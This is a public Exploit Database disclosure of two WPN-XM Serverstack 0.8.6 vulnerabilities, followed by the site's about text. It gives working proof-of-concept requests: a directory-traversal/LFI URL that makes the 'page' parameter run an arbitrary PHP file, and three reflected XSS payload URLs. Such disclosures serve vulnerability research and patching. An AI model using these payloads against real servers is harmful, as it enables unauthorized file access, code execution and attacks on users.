# Exploit Title: WPN-XM Serverstack for Windows 0.8.6 - Multiple Vulnerabilities
# Discovery by: Rafael Pedrero
# Discovery Date: 2022-02-13
# Vendor Homepage: http://wpn-xm.org/
# Software Link : https://github.com/WPN-XM/WPN-XM/
# Tested Version: 0.8.6
# Tested on:  Windows 10 using XAMPP

# Vulnerability Type: Local File Inclusion (LFI) & directory traversal
(path traversal)

CVSS v3: 7.5
CVSS vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
CWE: CWE-829, CWE-22

    Vulnerability description: WPN-XM Serverstack for Windows v0.8.6 allows
unauthenticated directory traversal and Local File Inclusion through the
parameter in an /tools/webinterface/index.php?page=..\..\..\..\..\..\hello
(without php) GET request.

Proof of concept:

To detect: http://localhost/tools/webinterface/index.php?page=)

The parameter "page" can be modified and load a php file in the server.

Example, In C:\:hello.php with this content:

C:\>type hello.php
<?php
echo "HELLO FROM C:\\hello.php";
?>

To Get hello.php in c:\ :
http://localhost/tools/webinterface/index.php?page=..\..\..\..\..\..\hello

Note: hello without ".php".

And you can see the PHP message into the browser at the start.

Response:

HELLO FROM C:\hello.php<!DOCTYPE html>
<html lang="en" dir="ltr" xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta charset="utf-8" />

# Vulnerability Type: reflected Cross-Site Scripting (XSS)

CVSS v3: 6.5
CVSS vector: 3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
CWE: CWE-79

Vulnerability description: WPN-XM Serverstack for Windows v0.8.6, does not
sufficiently encode user-controlled inputs, resulting in a reflected
Cross-Site Scripting (XSS) vulnerability via the
/tools/webinterface/index.php, in multiple parameters.

Proof of concept:

http://localhost/tools/webinterface/index.php?action=showtab%3Cscript%3Ealert(1);%3C/script%3E&page=config&tab=help
http://localhost/tools/webinterface/index.php?action=showtab&page=config%3Cscript%3Ealert(1);%3C/script%3E&tab=help
http://localhost/tools/webinterface/index.php?action=showtab&page=config&tab=help%3Cscript%3Ealert(1);%3C/script%3E

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/?utm_source=edb&utm_medium=web&utm_campaign=www), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Tester...
